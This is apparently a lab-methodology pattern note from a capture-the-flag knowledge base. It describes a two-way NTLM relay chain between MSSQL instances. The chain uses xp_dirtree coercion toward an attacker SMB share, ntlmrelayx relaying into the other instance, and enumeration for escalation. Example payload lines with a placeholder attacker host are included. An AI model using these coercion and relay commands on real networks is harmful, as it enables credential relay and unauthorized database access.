---
doc_kind: pattern
title: "Double-Direction NTLM Relay via MSSQL xp_dirtree Coercion"
category: misc
slug: double-ntlm-relay-xp-dirtree-mssql-coercion
created: 2026-10-25
status: draft
tags:
  - ntlm-relay
  - mssql
  - xp_dirtree
  - coercion
  - active-directory
chain_summary: "Two MSSQL instances that each trust the other's service account can be made to relay NTLM auth into each other: force outbound auth with xp_dirtree against an attacker SMB share, relay the captured NTLM session into the other instance's MSSQL TDS port (ntlmrelayx -t mssql://target) to gain CONNECT SQL as the coerced service account, then enumerate for sysadmin/impersonation paths."
---
# Double-Direction NTLM Relay via MSSQL xp_dirtree Coercion

## Chain Summary

- One-line chain: Two MSSQL instances that each trust the other's service account can be made to relay NTLM auth into each other: force outbound auth with xp_dirtree against an attacker SMB share, relay the captured NTLM session into the other instance's MSSQL TDS port (ntlmrelayx -t mssql://target) to gain CONNECT SQL as the coerced service account, then enumerate for sysadmin/impersonation paths.
- Typical target shape: small AD lab with two or more Windows hosts each running a named MSSQL instance (e.g. `SQLEXPRESS`) under its own domain service account, SMB signing disabled on the hosts, and `xp_dirtree` (or `xp_fileexist`/`xp_subdirs`) enabled and callable from an initially-reachable, low-privileged SQL login.

## Preconditions

- At least one low-privileged MSSQL login (often recoverable from an anonymously-readable config file on an SMB share) with permission to call `xp_dirtree` or another UNC-path-triggering extended stored procedure.
- SMB signing disabled on the target hosts (a hard precondition for NTLM relay to succeed over SMB-derived auth).
- Two or more MSSQL instances whose service accounts are domain accounts (not `NT SERVICE\...` virtual accounts) that each instance implicitly or explicitly trusts for incoming connections — specifically, instance B accepts the relayed NTLM identity of instance A's service account (and vice versa) as a valid login.

## Cheap Probes

- From an anonymous/guest SMB session, look for readable config files containing database credentials (`*.conf`, `*_db.conf`, web app config dumps) on any writable/readable share.
- `EXEC xp_dirtree '\\<attacker_ip>\share', 1, 1;` from a low-privileged SQL login — if the attacker's SMB listener (e.g. `responder`/`ntlmrelayx`'s own listener) captures an inbound NTLM auth attempt, the coercion primitive works.
- `nmap --script smb2-security-mode -p445 <host>` (or `netexec smb <host> --gen-relay-list`) to confirm SMB signing is disabled on candidate relay targets.

## Telltale Evidence

- A successful `xp_dirtree`-triggered NTLM auth attempt arriving at an attacker-controlled SMB listener, immediately followed by a successful relay (`ntlmrelayx -t mssql://<target>`) reporting authenticated access — confirms the whole chain end to end, independent of whether the resulting SQL privileges turn out to be useful.
- A relayed session landing with only `CONNECT SQL` (no `sysadmin`, no useful role membership) is not itself a failure signal — it means the *relay* worked but the *privileges* of the coerced account are limited; continue enumerating what that specific login can reach.

## Escalation Order

1. Recover a low-privileged MSSQL login (often from a plaintext config file reachable via anonymous SMB).
2. Confirm `xp_dirtree` (or equivalent) is callable from that login.
3. Stand up an NTLM relay listener (e.g. `ntlmrelayx.py -t mssql://<other_instance_host>`) and trigger `xp_dirtree '\\<attacker_ip>\share'` from the first instance to coerce its service account's NTLM auth toward the attacker.
4. Repeat the coercion in the **opposite direction** (coerce the second instance's service account toward the first instance) if the first relay's resulting privileges are insufficient — two MSSQL instances that both run `xp_dirtree`-callable logins and both trust each other's service accounts can often be relayed into each other symmetrically.
5. From each relayed session, enumerate `sys.server_role_members`, `sys.database_permissions`, database ownership (`sys.databases.owner_sid`), and `is_trustworthy_on` flags to find any database/role reachable from that specific relayed identity.
6. If relayed access alone doesn't yield `sysadmin`/impersonation, check for SQLAgent jobs/proxies reachable from the relayed login (see the related cross-forest AD pattern) as a secondary escalation path.

## Common Mistakes

- Treating a relay that only yields bare `CONNECT SQL` as a dead end instead of enumerating what that specific login can reach (database ownership, `IMPERSONATE` grants, `msdb` jobs).
- Only attempting the relay in one direction — when multiple MSSQL instances with separate service accounts are present, each is a potential coercion source *and* a potential relay target; try both directions.
- Overlooking a target database's `is_trustworthy_on = 0` flag as the reason a relayed, non-owning login can't reach it even with broad `VIEW ANY DATABASE`-style grants.

## Payload Shapes

```sql
-- Coercion trigger from a low-privileged SQL login
EXEC xp_dirtree '\\<attacker_ip>\share', 1, 1;
```

```bash
# Relay setup (conceptual — actual tooling may vary)
ntlmrelayx.py -t mssql://<other_mssql_instance_host> -smb2support
# Then trigger xp_dirtree from the coerced instance against <attacker_ip>
```

## Related Writeups

- `knowledge/writeups/misc/htb-reflection-prolab-double-ntlm-relay-handoff.md` (unsolved/handoff — relay itself confirmed working in both directions, but no further privilege obtained yet)

## Skill Impact

- Related skill: a dedicated AD/Pro Lab triage skill does not yet exist in this repo — consider proposing one via `skill-maintainer` once this pattern (or the cross-forest SQLAgent/RBCD pattern) recurs a third time.
- Rule to add or update: when SMB signing is disabled and `xp_dirtree` is callable on two or more MSSQL instances in the same lab, always test relay in **both** directions between them, not just toward the most obviously "important" host (e.g. the DC).
